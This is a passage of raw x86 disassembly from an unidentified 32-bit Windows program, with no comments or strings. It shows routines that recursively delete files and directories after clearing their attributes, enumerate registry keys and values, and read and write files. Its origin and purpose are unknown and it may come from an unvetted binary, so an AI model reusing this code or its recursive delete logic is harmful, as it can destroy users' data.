  40b555:	ff 75 0c             	push   0xc(%ebp)
  40b558:	6a 00                	push   $0x0
  40b55a:	68 10 04 00 00       	push   $0x410
  40b55f:	ff 15 e0 d0 40 00    	call   *0x40d0e0
  40b565:	8d 8d f8 fd ff ff    	lea    -0x208(%ebp),%ecx
  40b56b:	68 08 02 00 00       	push   $0x208
  40b570:	51                   	push   %ecx
  40b571:	6a 00                	push   $0x0
  40b573:	50                   	push   %eax
  40b574:	ff 15 08 1a 41 00    	call   *0x411a08
  40b57a:	85 c0                	test   %eax,%eax
  40b57c:	75 0b                	jne    0x40b589
  40b57e:	8d 45 0f             	lea    0xf(%ebp),%eax
  40b581:	50                   	push   %eax
  40b582:	68 b8 d8 40 00       	push   $0x40d8b8
  40b587:	eb 0b                	jmp    0x40b594
  40b589:	8d 45 0f             	lea    0xf(%ebp),%eax
  40b58c:	50                   	push   %eax
  40b58d:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
  40b593:	50                   	push   %eax
  40b594:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40b597:	ff 15 a0 d2 40 00    	call   *0x40d2a0
  40b59d:	8b 45 08             	mov    0x8(%ebp),%eax
  40b5a0:	c9                   	leave
  40b5a1:	c3                   	ret
  40b5a2:	55                   	push   %ebp
  40b5a3:	8b ec                	mov    %esp,%ebp
  40b5a5:	56                   	push   %esi
  40b5a6:	8b 35 54 d3 40 00    	mov    0x40d354,%esi
  40b5ac:	68 e4 d5 40 00       	push   $0x40d5e4
  40b5b1:	ff 75 08             	push   0x8(%ebp)
  40b5b4:	ff d6                	call   *%esi
  40b5b6:	59                   	pop    %ecx
  40b5b7:	85 c0                	test   %eax,%eax
  40b5b9:	59                   	pop    %ecx
  40b5ba:	74 14                	je     0x40b5d0
  40b5bc:	68 fc d6 40 00       	push   $0x40d6fc
  40b5c1:	ff 75 08             	push   0x8(%ebp)
  40b5c4:	ff d6                	call   *%esi
  40b5c6:	59                   	pop    %ecx
  40b5c7:	85 c0                	test   %eax,%eax
  40b5c9:	59                   	pop    %ecx
  40b5ca:	74 04                	je     0x40b5d0
  40b5cc:	33 c0                	xor    %eax,%eax
  40b5ce:	eb 03                	jmp    0x40b5d3
  40b5d0:	6a 01                	push   $0x1
  40b5d2:	58                   	pop    %eax
  40b5d3:	5e                   	pop    %esi
  40b5d4:	5d                   	pop    %ebp
  40b5d5:	c3                   	ret
  40b5d6:	55                   	push   %ebp
  40b5d7:	8b ec                	mov    %esp,%ebp
  40b5d9:	81 ec 68 06 00 00    	sub    $0x668,%esp
  40b5df:	53                   	push   %ebx
  40b5e0:	56                   	push   %esi
  40b5e1:	8b 35 3c d3 40 00    	mov    0x40d33c,%esi
  40b5e7:	57                   	push   %edi
  40b5e8:	ff 75 08             	push   0x8(%ebp)
  40b5eb:	8d 85 e8 fb ff ff    	lea    -0x418(%ebp),%eax
  40b5f1:	50                   	push   %eax
  40b5f2:	ff d6                	call   *%esi
  40b5f4:	8b 3d 2c d3 40 00    	mov    0x40d32c,%edi
  40b5fa:	8d 85 e8 fb ff ff    	lea    -0x418(%ebp),%eax
  40b600:	68 8c de 40 00       	push   $0x40de8c
  40b605:	50                   	push   %eax
  40b606:	ff d7                	call   *%edi
  40b608:	ff 75 08             	push   0x8(%ebp)
  40b60b:	8d 85 f0 fd ff ff    	lea    -0x210(%ebp),%eax
  40b611:	50                   	push   %eax
  40b612:	ff d6                	call   *%esi
  40b614:	8d 85 f0 fd ff ff    	lea    -0x210(%ebp),%eax
  40b61a:	68 f8 d6 40 00       	push   $0x40d6f8
  40b61f:	50                   	push   %eax
  40b620:	ff d7                	call   *%edi
  40b622:	83 c4 20             	add    $0x20,%esp
  40b625:	8d 85 98 f9 ff ff    	lea    -0x668(%ebp),%eax
  40b62b:	50                   	push   %eax
  40b62c:	8d 85 e8 fb ff ff    	lea    -0x418(%ebp),%eax
  40b632:	50                   	push   %eax
  40b633:	ff 15 68 d1 40 00    	call   *0x40d168
  40b639:	83 f8 ff             	cmp    $0xffffffff,%eax
  40b63c:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40b63f:	0f 84 f5 00 00 00    	je     0x40b73a
  40b645:	8d 85 f0 fd ff ff    	lea    -0x210(%ebp),%eax
  40b64b:	50                   	push   %eax
  40b64c:	8d 85 e8 fb ff ff    	lea    -0x418(%ebp),%eax
  40b652:	50                   	push   %eax
  40b653:	ff d6                	call   *%esi
  40b655:	8b 1d ec d0 40 00    	mov    0x40d0ec,%ebx
  40b65b:	59                   	pop    %ecx
  40b65c:	59                   	pop    %ecx
  40b65d:	c6 45 ff 01          	movb   $0x1,-0x1(%ebp)
  40b661:	8d 85 98 f9 ff ff    	lea    -0x668(%ebp),%eax
  40b667:	50                   	push   %eax
  40b668:	ff 75 f8             	push   -0x8(%ebp)
  40b66b:	ff 15 6c d1 40 00    	call   *0x40d16c
  40b671:	85 c0                	test   %eax,%eax
  40b673:	0f 84 8c 00 00 00    	je     0x40b705
  40b679:	8d 85 c4 f9 ff ff    	lea    -0x63c(%ebp),%eax
  40b67f:	50                   	push   %eax
  40b680:	e8 1d ff ff ff       	call   0x40b5a2
  40b685:	85 c0                	test   %eax,%eax
  40b687:	59                   	pop    %ecx
  40b688:	0f 85 86 00 00 00    	jne    0x40b714
  40b68e:	8d 85 c4 f9 ff ff    	lea    -0x63c(%ebp),%eax
  40b694:	50                   	push   %eax
  40b695:	8d 85 f0 fd ff ff    	lea    -0x210(%ebp),%eax
  40b69b:	50                   	push   %eax
  40b69c:	ff d7                	call   *%edi
  40b69e:	f6 85 98 f9 ff ff 10 	testb  $0x10,-0x668(%ebp)
  40b6a5:	59                   	pop    %ecx
  40b6a6:	59                   	pop    %ecx
  40b6a7:	74 2e                	je     0x40b6d7
  40b6a9:	8d 85 f0 fd ff ff    	lea    -0x210(%ebp),%eax
  40b6af:	50                   	push   %eax
  40b6b0:	e8 21 ff ff ff       	call   0x40b5d6
  40b6b5:	85 c0                	test   %eax,%eax
  40b6b7:	59                   	pop    %ecx
  40b6b8:	74 77                	je     0x40b731
  40b6ba:	8d 85 f0 fd ff ff    	lea    -0x210(%ebp),%eax
  40b6c0:	50                   	push   %eax
  40b6c1:	ff d3                	call   *%ebx
  40b6c3:	8d 85 e8 fb ff ff    	lea    -0x418(%ebp),%eax
  40b6c9:	50                   	push   %eax
  40b6ca:	8d 85 f0 fd ff ff    	lea    -0x210(%ebp),%eax
  40b6d0:	50                   	push   %eax
  40b6d1:	ff d6                	call   *%esi
  40b6d3:	59                   	pop    %ecx
  40b6d4:	59                   	pop    %ecx
  40b6d5:	eb 3d                	jmp    0x40b714
  40b6d7:	f6 85 98 f9 ff ff 01 	testb  $0x1,-0x668(%ebp)
  40b6de:	74 12                	je     0x40b6f2
  40b6e0:	8d 85 f0 fd ff ff    	lea    -0x210(%ebp),%eax
  40b6e6:	68 80 00 00 00       	push   $0x80
  40b6eb:	50                   	push   %eax
  40b6ec:	ff 15 20 d1 40 00    	call   *0x40d120
  40b6f2:	8d 85 f0 fd ff ff    	lea    -0x210(%ebp),%eax
  40b6f8:	50                   	push   %eax
  40b6f9:	ff 15 48 d1 40 00    	call   *0x40d148
  40b6ff:	85 c0                	test   %eax,%eax
  40b701:	74 2e                	je     0x40b731
  40b703:	eb be                	jmp    0x40b6c3
  40b705:	ff 15 14 d1 40 00    	call   *0x40d114
  40b70b:	83 f8 12             	cmp    $0x12,%eax
  40b70e:	75 21                	jne    0x40b731
  40b710:	80 65 ff 00          	andb   $0x0,-0x1(%ebp)
  40b714:	80 7d ff 00          	cmpb   $0x0,-0x1(%ebp)
  40b718:	0f 85 43 ff ff ff    	jne    0x40b661
  40b71e:	ff 75 f8             	push   -0x8(%ebp)
  40b721:	ff 15 38 d1 40 00    	call   *0x40d138
  40b727:	ff 75 08             	push   0x8(%ebp)
  40b72a:	ff d3                	call   *%ebx
  40b72c:	5f                   	pop    %edi
  40b72d:	5e                   	pop    %esi
  40b72e:	5b                   	pop    %ebx
  40b72f:	c9                   	leave
  40b730:	c3                   	ret
  40b731:	ff 75 f8             	push   -0x8(%ebp)
  40b734:	ff 15 38 d1 40 00    	call   *0x40d138
  40b73a:	33 c0                	xor    %eax,%eax
  40b73c:	eb ee                	jmp    0x40b72c
  40b73e:	55                   	push   %ebp
  40b73f:	8b ec                	mov    %esp,%ebp
  40b741:	51                   	push   %ecx
  40b742:	51                   	push   %ecx
  40b743:	8b 45 14             	mov    0x14(%ebp),%eax
  40b746:	53                   	push   %ebx
  40b747:	33 db                	xor    %ebx,%ebx
  40b749:	56                   	push   %esi
  40b74a:	2b c3                	sub    %ebx,%eax
  40b74c:	74 0e                	je     0x40b75c
  40b74e:	48                   	dec    %eax
  40b74f:	75 19                	jne    0x40b76a
  40b751:	6a 04                	push   $0x4
  40b753:	58                   	pop    %eax
  40b754:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40b757:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40b75a:	eb 0e                	jmp    0x40b76a
  40b75c:	c7 45 f8 00 00 00 40 	movl   $0x40000000,-0x8(%ebp)
  40b763:	c7 45 fc 02 00 00 00 	movl   $0x2,-0x4(%ebp)
  40b76a:	53                   	push   %ebx
  40b76b:	68 80 00 00 00       	push   $0x80
  40b770:	ff 75 fc             	push   -0x4(%ebp)
  40b773:	53                   	push   %ebx
  40b774:	53                   	push   %ebx
  40b775:	ff 75 f8             	push   -0x8(%ebp)
  40b778:	ff 75 10             	push   0x10(%ebp)
  40b77b:	ff 15 50 d1 40 00    	call   *0x40d150
  40b781:	8b f0                	mov    %eax,%esi
  40b783:	83 fe ff             	cmp    $0xffffffff,%esi
  40b786:	75 04                	jne    0x40b78c
  40b788:	32 c0                	xor    %al,%al
  40b78a:	eb 37                	jmp    0x40b7c3
  40b78c:	83 7d 14 01          	cmpl   $0x1,0x14(%ebp)
  40b790:	75 10                	jne    0x40b7a2
  40b792:	6a 02                	push   $0x2
  40b794:	53                   	push   %ebx
  40b795:	53                   	push   %ebx
  40b796:	56                   	push   %esi
  40b797:	ff 15 5c d1 40 00    	call   *0x40d15c
  40b79d:	83 f8 ff             	cmp    $0xffffffff,%eax
  40b7a0:	74 18                	je     0x40b7ba
  40b7a2:	8d 45 10             	lea    0x10(%ebp),%eax
  40b7a5:	53                   	push   %ebx
  40b7a6:	50                   	push   %eax
  40b7a7:	ff 75 0c             	push   0xc(%ebp)
  40b7aa:	ff 75 08             	push   0x8(%ebp)
  40b7ad:	56                   	push   %esi
  40b7ae:	ff 15 80 d1 40 00    	call   *0x40d180
  40b7b4:	85 c0                	test   %eax,%eax
  40b7b6:	74 02                	je     0x40b7ba
  40b7b8:	b3 01                	mov    $0x1,%bl
  40b7ba:	56                   	push   %esi
  40b7bb:	ff 15 a4 d1 40 00    	call   *0x40d1a4
  40b7c1:	8a c3                	mov    %bl,%al
  40b7c3:	5e                   	pop    %esi
  40b7c4:	5b                   	pop    %ebx
  40b7c5:	c9                   	leave
  40b7c6:	c3                   	ret
  40b7c7:	55                   	push   %ebp
  40b7c8:	8b ec                	mov    %esp,%ebp
  40b7ca:	53                   	push   %ebx
  40b7cb:	33 db                	xor    %ebx,%ebx
  40b7cd:	56                   	push   %esi
  40b7ce:	53                   	push   %ebx
  40b7cf:	68 80 00 00 00       	push   $0x80
  40b7d4:	6a 03                	push   $0x3
  40b7d6:	53                   	push   %ebx
  40b7d7:	6a 03                	push   $0x3
  40b7d9:	68 00 00 00 80       	push   $0x80000000
  40b7de:	ff 75 08             	push   0x8(%ebp)
  40b7e1:	ff 15 50 d1 40 00    	call   *0x40d150
  40b7e7:	8b f0                	mov    %eax,%esi
  40b7e9:	83 fe ff             	cmp    $0xffffffff,%esi
  40b7ec:	75 04                	jne    0x40b7f2
  40b7ee:	32 c0                	xor    %al,%al
  40b7f0:	eb 40                	jmp    0x40b832
  40b7f2:	57                   	push   %edi
  40b7f3:	53                   	push   %ebx
  40b7f4:	56                   	push   %esi
  40b7f5:	ff 15 54 d1 40 00    	call   *0x40d154
  40b7fb:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40b7fe:	8b f8                	mov    %eax,%edi
  40b800:	53                   	push   %ebx
  40b801:	57                   	push   %edi
  40b802:	ff 15 0c d2 40 00    	call   *0x40d20c
  40b808:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40b80b:	8d 45 08             	lea    0x8(%ebp),%eax
  40b80e:	53                   	push   %ebx
  40b80f:	50                   	push   %eax
  40b810:	57                   	push   %edi
  40b811:	89 5d 08             	mov    %ebx,0x8(%ebp)
  40b814:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  40b81a:	50                   	push   %eax
  40b81b:	56                   	push   %esi
  40b81c:	ff 15 7c d1 40 00    	call   *0x40d17c
  40b822:	85 c0                	test   %eax,%eax
  40b824:	5f                   	pop    %edi
  40b825:	74 02                	je     0x40b829
  40b827:	b3 01                	mov    $0x1,%bl
  40b829:	56                   	push   %esi
  40b82a:	ff 15 a4 d1 40 00    	call   *0x40d1a4
  40b830:	8a c3                	mov    %bl,%al
  40b832:	5e                   	pop    %esi
  40b833:	5b                   	pop    %ebx
  40b834:	5d                   	pop    %ebp
  40b835:	c3                   	ret
  40b836:	55                   	push   %ebp
  40b837:	8b ec                	mov    %esp,%ebp
  40b839:	53                   	push   %ebx
  40b83a:	6a 00                	push   $0x0
  40b83c:	ff 75 18             	push   0x18(%ebp)
  40b83f:	8d 4d 08             	lea    0x8(%ebp),%ecx
  40b842:	ff 15 b8 d2 40 00    	call   *0x40d2b8
  40b848:	50                   	push   %eax
  40b849:	8d 4d 08             	lea    0x8(%ebp),%ecx
  40b84c:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  40b852:	50                   	push   %eax
  40b853:	e8 e6 fe ff ff       	call   0x40b73e
  40b858:	83 c4 10             	add    $0x10,%esp
  40b85b:	8d 4d 08             	lea    0x8(%ebp),%ecx
  40b85e:	8a d8                	mov    %al,%bl
  40b860:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  40b866:	8a c3                	mov    %bl,%al
  40b868:	5b                   	pop    %ebx
  40b869:	5d                   	pop    %ebp
  40b86a:	c3                   	ret
  40b86b:	55                   	push   %ebp
  40b86c:	8b ec                	mov    %esp,%ebp
  40b86e:	81 ec 44 05 00 00    	sub    $0x544,%esp
  40b874:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40b877:	56                   	push   %esi
  40b878:	50                   	push   %eax
  40b879:	33 f6                	xor    %esi,%esi
  40b87b:	68 19 00 02 00       	push   $0x20019
  40b880:	56                   	push   %esi
  40b881:	68 38 df 40 00       	push   $0x40df38
  40b886:	68 02 00 00 80       	push   $0x80000002
  40b88b:	ff 15 30 d0 40 00    	call   *0x40d030
  40b891:	85 c0                	test   %eax,%eax
  40b893:	74 1a                	je     0x40b8af
  40b895:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40b898:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40b89b:	50                   	push   %eax
  40b89c:	68 b8 d8 40 00       	push   $0x40d8b8
  40b8a1:	ff 15 a0 d2 40 00    	call   *0x40d2a0
  40b8a7:	8b 45 08             	mov    0x8(%ebp),%eax
  40b8aa:	e9 f8 02 00 00       	jmp    0x40bba7
  40b8af:	53                   	push   %ebx
  40b8b0:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40b8b3:	57                   	push   %edi
  40b8b4:	50                   	push   %eax
  40b8b5:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  40b8b8:	89 75 ec             	mov    %esi,-0x14(%ebp)
  40b8bb:	c7 45 f0 00 04 00 00 	movl   $0x400,-0x10(%ebp)
  40b8c2:	ff 15 20 d2 40 00    	call   *0x40d220
  40b8c8:	56                   	push   %esi
  40b8c9:	56                   	push   %esi
  40b8ca:	56                   	push   %esi
  40b8cb:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40b8ce:	56                   	push   %esi
  40b8cf:	8b 3d 04 d0 40 00    	mov    0x40d004,%edi
  40b8d5:	50                   	push   %eax
  40b8d6:	8d 85 bc fa ff ff    	lea    -0x544(%ebp),%eax
  40b8dc:	50                   	push   %eax
  40b8dd:	56                   	push   %esi
  40b8de:	ff 75 f4             	push   -0xc(%ebp)
  40b8e1:	ff d7                	call   *%edi
  40b8e3:	bb 03 01 00 00       	mov    $0x103,%ebx
  40b8e8:	3b c3                	cmp    %ebx,%eax
  40b8ea:	0f 84 93 02 00 00    	je     0x40bb83
  40b8f0:	3b c6                	cmp    %esi,%eax
  40b8f2:	0f 85 65 02 00 00    	jne    0x40bb5d
  40b8f8:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40b8fb:	50                   	push   %eax
  40b8fc:	68 19 00 02 00       	push   $0x20019
  40b901:	8d 85 bc fa ff ff    	lea    -0x544(%ebp),%eax
  40b907:	56                   	push   %esi
  40b908:	50                   	push   %eax
  40b909:	ff 75 f4             	push   -0xc(%ebp)
  40b90c:	ff 15 30 d0 40 00    	call   *0x40d030
  40b912:	85 c0                	test   %eax,%eax
  40b914:	0f 85 4d 02 00 00    	jne    0x40bb67
  40b91a:	68 20 df 40 00       	push   $0x40df20
  40b91f:	8d 45 dc             	lea    -0x24(%ebp),%eax
  40b922:	ff 75 f8             	push   -0x8(%ebp)
  40b925:	50                   	push   %eax
  40b926:	e8 6f a5 ff ff       	call   0x405e9a
  40b92b:	68 0c df 40 00       	push   $0x40df0c
  40b930:	8d 85 7c ff ff ff    	lea    -0x84(%ebp),%eax
  40b936:	ff 75 f8             	push   -0x8(%ebp)
  40b939:	50                   	push   %eax
  40b93a:	e8 5b a5 ff ff       	call   0x405e9a
  40b93f:	68 ec de 40 00       	push   $0x40deec
  40b944:	8d 45 9c             	lea    -0x64(%ebp),%eax
  40b947:	ff 75 f8             	push   -0x8(%ebp)
  40b94a:	50                   	push   %eax
  40b94b:	e8 4a a5 ff ff       	call   0x405e9a
  40b950:	68 cc de 40 00       	push   $0x40decc
  40b955:	8d 45 ac             	lea    -0x54(%ebp),%eax
  40b958:	ff 75 f8             	push   -0x8(%ebp)
  40b95b:	50                   	push   %eax
  40b95c:	e8 39 a5 ff ff       	call   0x405e9a
  40b961:	68 b4 de 40 00       	push   $0x40deb4
  40b966:	8d 45 bc             	lea    -0x44(%ebp),%eax
  40b969:	ff 75 f8             	push   -0x8(%ebp)
  40b96c:	50                   	push   %eax
  40b96d:	e8 28 a5 ff ff       	call   0x405e9a
  40b972:	68 94 de 40 00       	push   $0x40de94
  40b977:	8d 45 8c             	lea    -0x74(%ebp),%eax
  40b97a:	ff 75 f8             	push   -0x8(%ebp)
  40b97d:	50                   	push   %eax
  40b97e:	e8 17 a5 ff ff       	call   0x405e9a
  40b983:	83 c4 48             	add    $0x48,%esp
  40b986:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  40b989:	ff 15 10 d2 40 00    	call   *0x40d210
  40b98f:	84 c0                	test   %al,%al
  40b991:	0f 85 84 01 00 00    	jne    0x40bb1b
  40b997:	b8 34 de 40 00       	mov    $0x40de34,%eax
  40b99c:	68 30 d9 40 00       	push   $0x40d930
  40b9a1:	8d 4d 8c             	lea    -0x74(%ebp),%ecx
  40b9a4:	50                   	push   %eax
  40b9a5:	51                   	push   %ecx
  40b9a6:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  40b9a9:	50                   	push   %eax
  40b9aa:	51                   	push   %ecx
  40b9ab:	8d 8d 7c ff ff ff    	lea    -0x84(%ebp),%ecx
  40b9b1:	50                   	push   %eax
  40b9b2:	51                   	push   %ecx
  40b9b3:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  40b9b6:	50                   	push   %eax
  40b9b7:	51                   	push   %ecx
  40b9b8:	8d 4d 9c             	lea    -0x64(%ebp),%ecx
  40b9bb:	50                   	push   %eax
  40b9bc:	51                   	push   %ecx
  40b9bd:	50                   	push   %eax
  40b9be:	8d 45 dc             	lea    -0x24(%ebp),%eax
  40b9c1:	50                   	push   %eax
  40b9c2:	8d 85 cc fe ff ff    	lea    -0x134(%ebp),%eax
  40b9c8:	50                   	push   %eax
  40b9c9:	e8 fc 0c 00 00       	call   0x40c6ca
  40b9ce:	83 c4 0c             	add    $0xc,%esp
  40b9d1:	50                   	push   %eax
  40b9d2:	8d 85 ec fe ff ff    	lea    -0x114(%ebp),%eax
  40b9d8:	50                   	push   %eax
  40b9d9:	e8 f2 0c 00 00       	call   0x40c6d0
  40b9de:	83 c4 0c             	add    $0xc,%esp
  40b9e1:	50                   	push   %eax
  40b9e2:	8d 85 0c ff ff ff    	lea    -0xf4(%ebp),%eax
  40b9e8:	50                   	push   %eax
  40b9e9:	e8 dc 0c 00 00       	call   0x40c6ca
  40b9ee:	83 c4 0c             	add    $0xc,%esp
  40b9f1:	50                   	push   %eax
  40b9f2:	8d 85 2c ff ff ff    	lea    -0xd4(%ebp),%eax
  40b9f8:	50                   	push   %eax
  40b9f9:	e8 d2 0c 00 00       	call   0x40c6d0
  40b9fe:	83 c4 0c             	add    $0xc,%esp
  40ba01:	50                   	push   %eax
  40ba02:	8d 85 4c ff ff ff    	lea    -0xb4(%ebp),%eax
  40ba08:	50                   	push   %eax
  40ba09:	e8 bc 0c 00 00       	call   0x40c6ca
  40ba0e:	83 c4 0c             	add    $0xc,%esp
  40ba11:	50                   	push   %eax
  40ba12:	8d 85 5c ff ff ff    	lea    -0xa4(%ebp),%eax
  40ba18:	50                   	push   %eax
  40ba19:	e8 b2 0c 00 00       	call   0x40c6d0
  40ba1e:	83 c4 0c             	add    $0xc,%esp
  40ba21:	50                   	push   %eax
  40ba22:	8d 85 dc fe ff ff    	lea    -0x124(%ebp),%eax
  40ba28:	50                   	push   %eax
  40ba29:	e8 9c 0c 00 00       	call   0x40c6ca
  40ba2e:	83 c4 0c             	add    $0xc,%esp
  40ba31:	50                   	push   %eax
  40ba32:	8d 85 1c ff ff ff    	lea    -0xe4(%ebp),%eax
  40ba38:	50                   	push   %eax
  40ba39:	e8 92 0c 00 00       	call   0x40c6d0
  40ba3e:	83 c4 0c             	add    $0xc,%esp
  40ba41:	50                   	push   %eax
  40ba42:	8d 85 bc fe ff ff    	lea    -0x144(%ebp),%eax
  40ba48:	50                   	push   %eax
  40ba49:	e8 7c 0c 00 00       	call   0x40c6ca
  40ba4e:	83 c4 0c             	add    $0xc,%esp
  40ba51:	50                   	push   %eax
  40ba52:	8d 85 3c ff ff ff    	lea    -0xc4(%ebp),%eax
  40ba58:	50                   	push   %eax
  40ba59:	e8 72 0c 00 00       	call   0x40c6d0
  40ba5e:	83 c4 0c             	add    $0xc,%esp
  40ba61:	50                   	push   %eax
  40ba62:	8d 85 fc fe ff ff    	lea    -0x104(%ebp),%eax
  40ba68:	50                   	push   %eax
  40ba69:	e8 5c 0c 00 00       	call   0x40c6ca
  40ba6e:	83 c4 0c             	add    $0xc,%esp
  40ba71:	50                   	push   %eax
  40ba72:	8d 85 6c ff ff ff    	lea    -0x94(%ebp),%eax
  40ba78:	50                   	push   %eax
  40ba79:	e8 4c 0c 00 00       	call   0x40c6ca
  40ba7e:	83 c4 0c             	add    $0xc,%esp
  40ba81:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  40ba84:	50                   	push   %eax
  40ba85:	ff 15 18 d2 40 00    	call   *0x40d218
  40ba8b:	8d 8d 6c ff ff ff    	lea    -0x94(%ebp),%ecx
  40ba91:	ff 15 9c d2 40 00    	call   *0x40d29c
  40ba97:	8d 8d fc fe ff ff    	lea    -0x104(%ebp),%ecx
  40ba9d:	ff 15 9c d2 40 00    	call   *0x40d29c
  40baa3:	8d 8d 3c ff ff ff    	lea    -0xc4(%ebp),%ecx
  40baa9:	ff 15 9c d2 40 00    	call   *0x40d29c
  40baaf:	8d 8d bc fe ff ff    	lea    -0x144(%ebp),%ecx
  40bab5:	ff 15 9c d2 40 00    	call   *0x40d29c
  40babb:	8d 8d 1c ff ff ff    	lea    -0xe4(%ebp),%ecx
  40bac1:	ff 15 9c d2 40 00    	call   *0x40d29c
  40bac7:	8d 8d dc fe ff ff    	lea    -0x124(%ebp),%ecx
  40bacd:	ff 15 9c d2 40 00    	call   *0x40d29c
  40bad3:	8d 8d 5c ff ff ff    	lea    -0xa4(%ebp),%ecx
  40bad9:	ff 15 9c d2 40 00    	call   *0x40d29c
  40badf:	8d 8d 4c ff ff ff    	lea    -0xb4(%ebp),%ecx
  40bae5:	ff 15 9c d2 40 00    	call   *0x40d29c
  40baeb:	8d 8d 2c ff ff ff    	lea    -0xd4(%ebp),%ecx
  40baf1:	ff 15 9c d2 40 00    	call   *0x40d29c
  40baf7:	8d 8d 0c ff ff ff    	lea    -0xf4(%ebp),%ecx
  40bafd:	ff 15 9c d2 40 00    	call   *0x40d29c
  40bb03:	8d 8d ec fe ff ff    	lea    -0x114(%ebp),%ecx
  40bb09:	ff 15 9c d2 40 00    	call   *0x40d29c
  40bb0f:	8d 8d cc fe ff ff    	lea    -0x134(%ebp),%ecx
  40bb15:	ff 15 9c d2 40 00    	call   *0x40d29c
  40bb1b:	ff 75 f8             	push   -0x8(%ebp)
  40bb1e:	ff 15 34 d0 40 00    	call   *0x40d034
  40bb24:	8d 4d 8c             	lea    -0x74(%ebp),%ecx
  40bb27:	ff 15 9c d2 40 00    	call   *0x40d29c
  40bb2d:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  40bb30:	ff 15 9c d2 40 00    	call   *0x40d29c
  40bb36:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  40bb39:	ff 15 9c d2 40 00    	call   *0x40d29c
  40bb3f:	8d 4d 9c             	lea    -0x64(%ebp),%ecx
  40bb42:	ff 15 9c d2 40 00    	call   *0x40d29c
  40bb48:	8d 8d 7c ff ff ff    	lea    -0x84(%ebp),%ecx
  40bb4e:	ff 15 9c d2 40 00    	call   *0x40d29c
  40bb54:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  40bb57:	ff 15 9c d2 40 00    	call   *0x40d29c
  40bb5d:	ff 45 ec             	incl   -0x14(%ebp)
  40bb60:	c7 45 f0 00 04 00 00 	movl   $0x400,-0x10(%ebp)
  40bb67:	56                   	push   %esi
  40bb68:	56                   	push   %esi
  40bb69:	56                   	push   %esi
  40bb6a:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40bb6d:	56                   	push   %esi
  40bb6e:	50                   	push   %eax
  40bb6f:	8d 85 bc fa ff ff    	lea    -0x544(%ebp),%eax
  40bb75:	50                   	push   %eax
  40bb76:	ff 75 ec             	push   -0x14(%ebp)
  40bb79:	ff 75 f4             	push   -0xc(%ebp)
  40bb7c:	ff d7                	call   *%edi
  40bb7e:	e9 65 fd ff ff       	jmp    0x40b8e8
  40bb83:	ff 75 f4             	push   -0xc(%ebp)
  40bb86:	ff 15 34 d0 40 00    	call   *0x40d034
  40bb8c:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40bb8f:	8d 45 cc             	lea    -0x34(%ebp),%eax
  40bb92:	50                   	push   %eax
  40bb93:	ff 15 34 d2 40 00    	call   *0x40d234
  40bb99:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  40bb9c:	ff 15 9c d2 40 00    	call   *0x40d29c
  40bba2:	8b 45 08             	mov    0x8(%ebp),%eax
  40bba5:	5f                   	pop    %edi
  40bba6:	5b                   	pop    %ebx
  40bba7:	5e                   	pop    %esi
  40bba8:	c9                   	leave
  40bba9:	c3                   	ret
  40bbaa:	55                   	push   %ebp
  40bbab:	8b ec                	mov    %esp,%ebp
  40bbad:	83 ec 0c             	sub    $0xc,%esp
  40bbb0:	8b 45 08             	mov    0x8(%ebp),%eax
  40bbb3:	53                   	push   %ebx
  40bbb4:	56                   	push   %esi
  40bbb5:	83 e8 00             	sub    $0x0,%eax
  40bbb8:	57                   	push   %edi
  40bbb9:	0f 84 13 01 00 00    	je     0x40bcd2
  40bbbf:	48                   	dec    %eax
  40bbc0:	0f 84 cb 00 00 00    	je     0x40bc91
  40bbc6:	48                   	dec    %eax
  40bbc7:	0f 84 89 00 00 00    	je     0x40bc56
  40bbcd:	48                   	dec    %eax
  40bbce:	74 4b                	je     0x40bc1b
  40bbd0:	48                   	dec    %eax
  40bbd1:	0f 85 4c 01 00 00    	jne    0x40bd23
  40bbd7:	6a 01                	push   $0x1
  40bbd9:	8d 45 0b             	lea    0xb(%ebp),%eax
  40bbdc:	83 ec 10             	sub    $0x10,%esp
  40bbdf:	8b cc                	mov    %esp,%ecx
  40bbe1:	50                   	push   %eax
  40bbe2:	68 c4 dc 40 00       	push   $0x40dcc4
  40bbe7:	ff 15 a4 d2 40 00    	call   *0x40d2a4
  40bbed:	bf 90 df 40 00       	mov    $0x40df90,%edi
  40bbf2:	68 80 df 40 00       	push   $0x40df80
  40bbf7:	be 01 00 00 80       	mov    $0x80000001,%esi
  40bbfc:	57                   	push   %edi
  40bbfd:	56                   	push   %esi
  40bbfe:	e8 8a a3 ff ff       	call   0x405f8d
  40bc03:	83 c4 20             	add    $0x20,%esp
  40bc06:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40bc09:	6a 01                	push   $0x1
  40bc0b:	83 ec 10             	sub    $0x10,%esp
  40bc0e:	8b cc                	mov    %esp,%ecx
  40bc10:	50                   	push   %eax
  40bc11:	68 20 d6 40 00       	push   $0x40d620
  40bc16:	e9 f3 00 00 00       	jmp    0x40bd0e
  40bc1b:	6a 01                	push   $0x1
  40bc1d:	8d 45 fe             	lea    -0x2(%ebp),%eax
  40bc20:	83 ec 10             	sub    $0x10,%esp
  40bc23:	8b cc                	mov    %esp,%ecx
  40bc25:	50                   	push   %eax
  40bc26:	68 f8 dc 40 00       	push   $0x40dcf8
  40bc2b:	ff 15 a4 d2 40 00    	call   *0x40d2a4
